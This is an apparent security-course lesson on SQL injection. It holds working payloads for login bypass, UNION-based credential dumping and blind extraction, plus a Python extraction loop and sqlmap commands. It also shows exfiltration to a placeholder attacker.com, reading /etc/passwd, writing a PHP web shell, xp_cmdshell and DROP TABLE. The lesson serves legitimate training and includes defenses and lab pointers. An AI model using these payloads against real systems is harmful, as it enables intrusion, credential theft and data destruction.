# Lesson 3.3: SQL Injection (SQLi)

## Objective
Master SQL injection techniques to exploit vulnerable web applications and understand database security fundamentals.

---

## What is SQL Injection?

SQL Injection is a code injection technique that exploits vulnerabilities in an application's database layer. Attackers insert malicious SQL code into application queries to:
- Bypass authentication
- Extract sensitive data
- Modify/delete data
- Execute administrative operations
- In some cases, execute OS commands

**OWASP Rank:** #3 in OWASP Top 10 (2021)

---

## How SQL Injection Works

### Vulnerable Code Example (PHP):
```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);
```

### Normal Query:
```sql
SELECT * FROM users WHERE username='admin' AND password='pass123'
```

### Injected Query:
Input: Username: `admin' --` Password: `(anything)`

```sql
SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
```

The `--` comments out the rest of the query, bypassing password check!

---

## Types of SQL Injection

### 1. In-Band SQLi (Classic)
Results are returned directly in the application response.

#### a) Error-Based SQLi
Triggers database errors to extract information.

```sql
' OR 1=1 --
' UNION SELECT NULL,NULL,NULL --
```

#### b) Union-Based SQLi
Uses UNION to combine results from multiple queries.

```sql
' UNION SELECT username,password FROM users --
' UNION SELECT NULL,table_name FROM information_schema.tables --
```

---

### 2. Blind SQLi
No visible error/output, must infer results.

#### a) Boolean-Based Blind SQLi
```sql
# Test if first character of database name is 'a'
' AND SUBSTR(DATABASE(),1,1)='a' --

# If page behaves normally: TRUE
# If page behaves differently: FALSE
```

#### b) Time-Based Blind SQLi
```sql
' AND IF(SUBSTR(DATABASE(),1,1)='a',SLEEP(5),0) --

# If response is delayed 5 seconds: TRUE
# If immediate response: FALSE
```

---

### 3. Out-of-Band SQLi
Uses different channels (DNS, HTTP) to exfiltrate data.

```sql
'; EXEC xp_dirtree '\\attacker.com\share\' --
```

---

## SQL Injection Attack Process

### Step 1: Detection

Test for SQLi with simple payloads:

```sql
'
"
`
')
")
`]
```

**Signs of vulnerability:**
- Database errors
- Blank pages
- Different page behavior
- Delayed responses

### Example Test:
```
https://example.com/product.php?id=1'
```

If you see error like:
```
You have an error in your SQL syntax near ''' at line 1
```
**VULNERABLE!**

---

### Step 2: Determine Number of Columns

Use ORDER BY to find column count:

```sql
' ORDER BY 1 --    # Works
' ORDER BY 2 --    # Works
' ORDER BY 3 --    # Works
' ORDER BY 4 --    # Error! So 3 columns
```

Or use UNION SELECT with NULLs:

```sql
' UNION SELECT NULL --              # Error
' UNION SELECT NULL,NULL --         # Error
' UNION SELECT NULL,NULL,NULL --    # Success! 3 columns
```

---

### Step 3: Find Injectable Columns

Determine which columns display data:

```sql
' UNION SELECT 1,2,3 --
```

Look at page - if you see "2" displayed, column 2 is injectable!

---

### Step 4: Enumerate Database

#### MySQL:
```sql
# Database version
' UNION SELECT NULL,@@version,NULL --

# Current database
' UNION SELECT NULL,database(),NULL --

# List all databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata --

# List tables in current database
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database() --

# List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' --

# Extract data
' UNION SELECT NULL,username,password FROM users --
```

#### PostgreSQL:
```sql
' UNION SELECT NULL,version(),NULL --
' UNION SELECT NULL,current_database(),NULL --
' UNION SELECT NULL,tablename,NULL FROM pg_tables --
```

#### MSSQL:
```sql
' UNION SELECT NULL,@@version,NULL --
' UNION SELECT NULL,DB_NAME(),NULL --
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U' --
```

#### Oracle:
```sql
' UNION SELECT NULL,banner,NULL FROM v$version --
' UNION SELECT NULL,table_name,NULL FROM all_tables --
```

---

## Authentication Bypass

### Common Payloads:

```sql
' OR '1'='1
' OR 1=1 --
' OR 'a'='a
admin' --
admin' #
admin'/*
' or 1=1 limit 1 --
```

### Login Form Example:

**Username:** `admin' --`
**Password:** `(anything)`

Resulting query:
```sql
SELECT * FROM users WHERE username='admin' -- ' AND password='...'
```

---

## Union-Based Extraction Example

### Full Attack Chain:

1. **Detect vulnerability:**
```
https://shop.com/product?id=1'
```

2. **Find column count:**
```
https://shop.com/product?id=1' ORDER BY 4 --
```

3. **Identify injectable column:**
```
https://shop.com/product?id=-1' UNION SELECT 1,2,3,4 --
```
(Assume column 2 displays on page)

4. **Extract database name:**
```
https://shop.com/product?id=-1' UNION SELECT 1,database(),3,4 --
```

5. **List tables:**
```
https://shop.com/product?id=-1' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database() --
```

6. **List columns from 'users' table:**
```
https://shop.com/product?id=-1' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users' --
```

7. **Extract usernames and passwords:**
```
https://shop.com/product?id=-1' UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users --
```

---

## Blind SQL Injection

### Boolean-Based Example:

Test each character of database name:

```python
import requests

url = "http://example.com/page?id=1"
database_name = ""
characters = "abcdefghijklmnopqrstuvwxyz0123456789_"

for position in range(1, 20):
    for char in characters:
        payload = f"' AND SUBSTR(DATABASE(),{position},1)='{char}' --"
        response = requests.get(url + payload)

        if "Welcome" in response.text:  # Success indicator
            database_name += char
            print(f"Found: {database_name}")
            break
```

### Time-Based Example:

```sql
# Test if database starts with 'w'
' AND IF(SUBSTR(DATABASE(),1,1)='w',SLEEP(5),0) --

# If it takes 5 seconds to respond, first letter is 'w'
```

---

## Advanced Techniques

### 1. Reading Files (MySQL)

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL --
```

### 2. Writing Files (MySQL)

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL,NULL INTO OUTFILE '/var/www/html/shell.php' --
```

### 3. Executing Commands (MSSQL)

```sql
'; EXEC xp_cmdshell 'whoami' --
```

### 4. Stacked Queries

```sql
'; DROP TABLE users --
'; UPDATE users SET password='hacked' WHERE username='admin' --
```

---

## Bypassing Filters

### 1. Comment Syntax Variations
```sql
--
#
/**/
--+
--;
```

### 2. Case Variation
```sql
UnIoN SeLeCt
```

### 3. Inline Comments
```sql
UN/**/ION SE/**/LECT
/*!UNION*/ /*!SELECT*/
```

### 4. URL Encoding
```sql
%27 = '
%23 = #
%2d%2d = --
```

### 5. Alternative Syntax
```sql
# Instead of: ' OR 1=1
' OR 'x'='x
' OR 1=1 limit 1
' || 1=1 --
```

---

## SQL Injection Tools

### 1. SQLMap (Automated)
```bash
# Basic scan
sqlmap -u "http://example.com/page?id=1"

# Enumerate databases
sqlmap -u "http://example.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://example.com/page?id=1" -D database_name --tables

# Dump table
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --dump

# POST request
sqlmap -u "http://example.com/login" --data="user=admin&pass=test"

# With authentication
sqlmap -u "http://example.com/page?id=1" --cookie="PHPSESSID=abc123"
```

### 2. Manual with Burp Suite
1. Intercept request
2. Send to Repeater
3. Test payloads manually
4. Use Intruder for automation

---

## Defense Against SQL Injection

### 1. Prepared Statements (Parameterized Queries)

**Good (PHP):**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

### 2. Input Validation
```php
$id = intval($_GET['id']); // Force integer
```

### 3. Escaping Input
```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
```

### 4. Least Privilege
Database user should only have necessary permissions.

### 5. Web Application Firewall (WAF)
Filter malicious requests.

---

## Practice Challenges

### Exercise 1: Basic Authentication Bypass
Target: Login form at `http://testsite.local/login`

Try these payloads:
- `admin' --`
- `' OR 1=1 --`
- `admin' OR '1'='1`

### Exercise 2: Union-Based Extraction
Target: `http://testsite.local/product?id=1`

Tasks:
1. Detect SQLi vulnerability
2. Find number of columns
3. Extract database name
4. List all tables
5. Extract user credentials

### Exercise 3: Blind SQLi
Target: `http://testsite.local/search?q=test`

Extract database name character by character using boolean-based technique.

---

## Labs & Practice Platforms

1. **DVWA (Damn Vulnerable Web App)**
   - SQL Injection module (Low, Medium, High difficulty)

2. **SQLi Labs**
   - https://github.com/Audi-1/sqli-labs
   - 75 different SQLi challenges

3. **PortSwigger Web Security Academy**
   - https://portswigger.net/web-security/sql-injection

4. **HackTheBox**
   - Machines with SQL injection vulnerabilities

5. **TryHackMe**
   - SQL Injection room

---

## Real-World Impact

### Notable SQL Injection Attacks:

- **Yahoo (2012):** 450,000 credentials stolen
- **Heartland Payment Systems (2008):** 134 million credit cards
- **Sony Pictures (2011):** 1 million accounts compromised

---

## Key Takeaways

1. SQL injection is one of the most dangerous web vulnerabilities
2. Always test for SQLi in user inputs (GET, POST, cookies, headers)
3. Union-based is fastest, blind is more reliable
4. Automated tools (SQLMap) save time but manual testing teaches fundamentals
5. Prepared statements are the best defense

---

## Cheat Sheet

```sql
# Detection
'
"
' OR 1=1 --

# Find columns
' ORDER BY 1,2,3 --
' UNION SELECT NULL,NULL,NULL --

# MySQL Enumeration
' UNION SELECT @@version,database(),user() --
' UNION SELECT table_name,NULL FROM information_schema.tables --
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --

# Data Extraction
' UNION SELECT username,password FROM users --
' UNION SELECT group_concat(username,0x3a,password) FROM users --

# File Operations (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd') --
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php' --
```

---

**Next Lesson:** [3.4 - Cross-Site Scripting (XSS)](./02-xss.md)

**Practice Script:** `../scripts/sqli_scanner.sh`
